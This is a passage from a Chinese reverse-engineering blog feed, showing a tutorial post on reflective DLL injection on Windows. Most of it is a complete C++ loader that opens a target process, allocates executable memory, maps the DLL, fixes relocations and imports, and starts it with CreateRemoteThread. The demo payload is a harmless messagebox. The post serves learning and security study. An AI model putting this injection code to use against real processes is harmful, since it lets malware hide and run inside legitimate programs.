class="line">VirtualAllocEx();<span class="comment">//申请空间</span></span><br><span class="line">WriteProcessMemory();<span class="comment">//写入内容</span></span><br><span class="line">CreatRemoteThread();<span class="comment">//创建线程</span></span><br><span class="line"></span><br><span class="line">GetModuleHandle();<span class="comment">//取模块句柄</span></span><br><span class="line">GetProcAddress();<span class="comment">//取函数地址</span></span><br></pre></td></tr></table></figure><p>但是如果是在自己的进程先执行，然后复制到目标进程进行操作（只要不涉及导入其它库就可以）那么在目标进程中只有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OpenProcess();<span class="comment">//通过pid获取句柄</span></span><br><span class="line"></span><br><span class="line">VirtualAllocEx();<span class="comment">//申请空间</span></span><br><span class="line">WriteProcessMemory();<span class="comment">//写入内容</span></span><br><span class="line">CreatRemoteThread();<span class="comment">//创建线程</span></span><br></pre></td></tr></table></figure><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ReflectLoader.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* DLLpath = <span class="string">&quot;C:\\Users\\a2879\\source\\repos\\DLLreflectLoader\\x64\\Debug\\messageboxDLL.dll&quot;</span>;</span><br><span class="line">DWORD dwPid = <span class="number">0</span>;</span><br><span class="line">std::cin &gt;&gt; dwPid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">ReflectLoader <span class="title">myPE</span><span class="params">(dwPid, DLLpath)</span></span>;</span><br><span class="line"><span class="comment">//myPE.setflag(1);</span></span><br><span class="line">myPE.<span class="built_in">run</span>(<span class="string">&quot;getInMain&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ReflectLoader.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectLoader</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">HANDLE hTargetProcess;</span><br><span class="line">LPVOID remoteMem;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* targetPath;</span><br><span class="line">std::unique_ptr&lt;BYTE[]&gt; fileBase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PIMAGE_DOS_HEADER dosHeader;</span><br><span class="line">PIMAGE_NT_HEADERS ntHeader;</span><br><span class="line">PIMAGE_FILE_HEADER fileHeader;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER optionalHeader;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> memSize;</span><br><span class="line"><span class="type">size_t</span> memHeaderSize;</span><br><span class="line"><span class="type">size_t</span> sectionAlignment;</span><br><span class="line">DWORD64 imageBase;</span><br><span class="line"></span><br><span class="line">BYTE flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line"><span class="built_in">ReflectLoader</span>(DWORD dwPid, <span class="type">const</span> <span class="type">char</span>* dllPath) &#123;</span><br><span class="line">hTargetProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">fileBase = <span class="built_in">mapToMemory</span>(dllPath);</span><br><span class="line"><span class="built_in">loadPEstruct</span>(fileBase.<span class="built_in">get</span>());</span><br><span class="line">remoteMem = <span class="built_in">VirtualAllocEx</span>(hTargetProcess, <span class="literal">NULL</span>, memSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">run</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* expFuncName)</span> </span>&#123;</span><br><span class="line">LPVOID memBase = <span class="built_in">VirtualAllocEx</span>(<span class="built_in">GetCurrentProcess</span>(), remoteMem, memSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!memBase) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">makeHeadandSectionMap</span>(memBase, fileBase.<span class="built_in">get</span>());</span><br><span class="line"><span class="built_in">repareReloc</span>(memBase);</span><br><span class="line"><span class="built_in">repareIAT</span>(memBase);</span><br><span class="line"><span class="built_in">setImageBase</span>(memBase);</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> bytesWritten;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hTargetProcess, remoteMem, memBase, memSize, &amp;bytesWritten);</span><br><span class="line"><span class="keyword">if</span> (bytesWritten != memSize) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;写入目标进程失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPVOID targetFunc = <span class="built_in">getExplor</span>(memBase, expFuncName);</span><br><span class="line"><span class="built_in">CreateRemoteThread</span>(hTargetProcess,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">(LPTHREAD_START_ROUTINE)targetFunc,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="function">std::unique_ptr&lt;BYTE[]&gt; <span class="title">mapToMemory</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filePath)</span> </span>&#123;</span><br><span class="line">FILE* file;</span><br><span class="line"><span class="type">errno_t</span> err = <span class="built_in">fopen_s</span>(&amp;file, filePath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fseek</span>(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line"><span class="type">size_t</span> fileSize = <span class="built_in">ftell</span>(file);</span><br><span class="line"><span class="built_in">fseek</span>(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line"><span class="function">std::unique_ptr&lt;BYTE[]&gt; <span class="title">fileData</span><span class="params">(<span class="keyword">new</span> BYTE[fileSize])</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!fileData) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fread</span>(fileData.<span class="built_in">get</span>(), <span class="number">1</span>, fileSize, file);</span><br><span class="line"><span class="built_in">fclose</span>(file);</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;成功申请内存: 0x%llX\n&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(fileData.<span class="built_in">get</span>()));</span><br><span class="line"><span class="keyword">return</span> fileData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">loadPEstruct</span><span class="params">(BYTE* rawdata)</span> </span>&#123;</span><br><span class="line">dosHeader = (PIMAGE_DOS_HEADER)rawdata;</span><br><span class="line">ntHeader = (PIMAGE_NT_HEADERS)(rawdata + dosHeader-&gt;e_lfanew);</span><br><span class="line">fileHeader = &amp;(ntHeader-&gt;FileHeader);</span><br><span class="line">optionalHeader = &amp;(ntHeader-&gt;OptionalHeader);</span><br><span class="line"></span><br><span class="line">imageBase = optionalHeader-&gt;ImageBase;</span><br><span class="line">memSize = optionalHeader-&gt;SizeOfImage;</span><br><span class="line">memHeaderSize = optionalHeader-&gt;SizeOfHeaders;</span><br><span class="line">sectionAlignment = optionalHeader-&gt;SectionAlignment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">makeHeadandSectionMap</span><span class="params">(LPVOID memBase, <span class="type">const</span> BYTE* fileBase)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------开始映射节区--------\n&quot;</span>);</span><br><span class="line"><span class="built_in">RtlMoveMemory</span>(memBase, fileBase, memHeaderSize);</span><br><span class="line"></span><br><span class="line">PIMAGE_SECTION_HEADER sectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(ntHeader);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; fileHeader-&gt;NumberOfSections; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (sectionHeader[i].VirtualAddress == <span class="number">0</span> &amp;&amp; sectionHeader[i].SizeOfRawData == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID srcMem = (LPVOID)(fileBase + sectionHeader[i].PointerToRawData);</span><br><span class="line">LPVOID dstMem = (BYTE*)memBase + sectionHeader[i].VirtualAddress;</span><br><span class="line"><span class="type">size_t</span> sizeOfRawData = sectionHeader[i].SizeOfRawData;</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(dstMem, srcMem, sizeOfRawData);</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 节区%d: %s, 映射到内存 0x%llX\n&quot;</span>, i, sectionHeader[i].Name, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(dstMem));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------映射节区结束--------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">repareReloc</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------开始修复重定位表-------\n&quot;</span>);</span><br><span class="line">PIMAGE_BASE_RELOCATION relTable = (PIMAGE_BASE_RELOCATION)((BYTE*)memBase + optionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line"><span class="type">size_t</span> delta = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(memBase) - optionalHeader-&gt;ImageBase;</span><br><span class="line"><span class="keyword">if</span> (relTable == <span class="literal">nullptr</span> || delta == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (relTable-&gt;SizeOfBlock != <span class="number">0</span> &amp;&amp; relTable-&gt;VirtualAddress != <span class="number">0</span>) &#123;</span><br><span class="line">WORD* pRdata = (WORD*)((BYTE*)relTable + <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"><span class="type">size_t</span> dataNum = (relTable-&gt;SizeOfBlock - <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="built_in">sizeof</span>(WORD);</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 表%d:\n&quot;</span>, j);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dataNum; i++) &#123;</span><br><span class="line">DWORD type = pRdata[i] &gt;&gt; <span class="number">12</span>;</span><br><span class="line"><span class="keyword">if</span> (type == IMAGE_REL_BASED_DIR64) &#123;</span><br><span class="line">DWORD64* targetAddress = (DWORD64*)((BYTE*)memBase + relTable-&gt;VirtualAddress + (pRdata[i] &amp; <span class="number">0xFFF</span>));</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 对应地址: 0x%llX 数据: 0x%llX\n&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(targetAddress), *targetAddress);</span><br><span class="line">*targetAddress += delta;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   -&gt; 0x%llX  delta: 0x%llX\n&quot;</span>, *targetAddress, delta);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">relTable = (PIMAGE_BASE_RELOCATION)((BYTE*)relTable + relTable-&gt;SizeOfBlock);</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------修复重定位表结束-------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">repareIAT</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------开始修复IAT--------\n&quot;</span>);</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)memBase + optionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line"><span class="keyword">while</span> (importDesc-&gt;OriginalFirstThunk) &#123;</span><br><span class="line"><span class="type">char</span>* Dllname = (<span class="type">char</span>*)((BYTE*)memBase + importDesc-&gt;Name);</span><br><span class="line">HMODULE hDll = <span class="built_in">GetModuleHandleA</span>(Dllname);</span><br><span class="line"><span class="keyword">if</span> (!hDll) &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 加载DLL:%s\n&quot;</span>, Dllname);</span><br><span class="line">hDll = <span class="built_in">LoadLibraryA</span>(Dllname);</span><br><span class="line"><span class="keyword">if</span> (!hDll) &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 加载DLL失败,导入函数终止\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - DLL已存在:%s\n&quot;</span>, Dllname);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_THUNK_DATA INT = (PIMAGE_THUNK_DATA)((BYTE*)memBase + importDesc-&gt;OriginalFirstThunk);</span><br><span class="line">PIMAGE_THUNK_DATA IAT = (PIMAGE_THUNK_DATA)((BYTE*)memBase + importDesc-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; INT[i].u1.AddressOfData; i++) &#123;</span><br><span class="line">DWORD64 pFunc = <span class="literal">NULL</span>;</span><br><span class="line">DWORD64 targetFunc = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;((BYTE*)memBase + INT[i].u1.AddressOfData);</span><br><span class="line"><span class="keyword">if</span> (targetFunc &amp; IMAGE_ORDINAL_FLAG) &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 以序号:%d 导入函数\n&quot;</span>, <span class="built_in">IMAGE_ORDINAL</span>(targetFunc));</span><br><span class="line">pFunc = (DWORD64)<span class="built_in">GetProcAddress</span>(hDll, <span class="built_in">MAKEINTRESOURCEA</span>(<span class="built_in">IMAGE_ORDINAL</span>(targetFunc)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 以名称:%s 导入函数\n&quot;</span>, ((PIMAGE_IMPORT_BY_NAME)targetFunc)-&gt;Name);</span><br><span class="line">pFunc = (DWORD64)<span class="built_in">GetProcAddress</span>(hDll, ((PIMAGE_IMPORT_BY_NAME)targetFunc)-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pFunc) &#123;</span><br><span class="line">IAT[i].u1.Function = pFunc;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 函数导入成功\n   - 目的地址: 0x%llX\n&quot;</span>, pFunc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 函数导入失败\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">importDesc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------修复IAT结束--------\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">setImageBase</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line">IMAGE_DOS_HEADER* dosHeader = (PIMAGE_DOS_HEADER)memBase;</span><br><span class="line">IMAGE_NT_HEADERS* ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)memBase + dosHeader-&gt;e_lfanew);</span><br><span class="line">ntHeader-&gt;OptionalHeader.ImageBase = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(memBase);</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------修正镜像基地址成功--------\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LPVOID <span class="title">getExplor</span><span class="params">(LPVOID memBase, <span class="type">const</span> <span class="type">char</span>* funcName)</span> </span>&#123;</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)memBase + (optionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));</span><br><span class="line">DWORD* addrOfNames = (DWORD*)((BYTE*)memBase + exp-&gt;AddressOfNames);</span><br><span class="line">DWORD dwNumOfName = exp-&gt;NumberOfNames;</span><br><span class="line"><span class="type">char</span>* pFuncName;</span><br><span class="line">DWORD* addrOfFunc = (DWORD*)((BYTE*)memBase + exp-&gt;AddressOfFunctions);</span><br><span class="line">DWORD* addrOfNameofNameOrdinals = (DWORD*)((BYTE*)memBase + exp-&gt;AddressOfNameOrdinals);</span><br><span class="line">LPVOID Func = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dwNumOfName; i++)</span><br><span class="line">&#123;</span><br><span class="line">pFuncName = (<span class="type">char</span>*)((BYTE*)memBase + addrOfNames[i]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">lstrcmpA</span>(pFuncName, funcName)) &#123;</span><br><span class="line">WORD hint = addrOfNameofNameOrdinals[i];</span><br><span class="line">Func = (LPVOID)((BYTE*)memBase + addrOfFunc[hint]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Func == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查找导出函数失败\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> Func;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">上一篇是PE加载器的实现</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="技能" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/"/>
    
    <category term="DLL注入" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/DLL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="shellcode注入" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/shellcode%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="DLL注入" scheme="https://www.pri87.vip/tags/DLL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>楚慧杯2024-re-wp</title>
    <link href="https://www.pri87.vip/posts/2dd40b61.html"/>
    <id>https://www.pri87.vip/posts/2dd40b61.html</id>
    <published>2024-12-20T09:37:30.000Z</published>
    <updated>2024-12-22T07:51:35.750Z</updated>
    
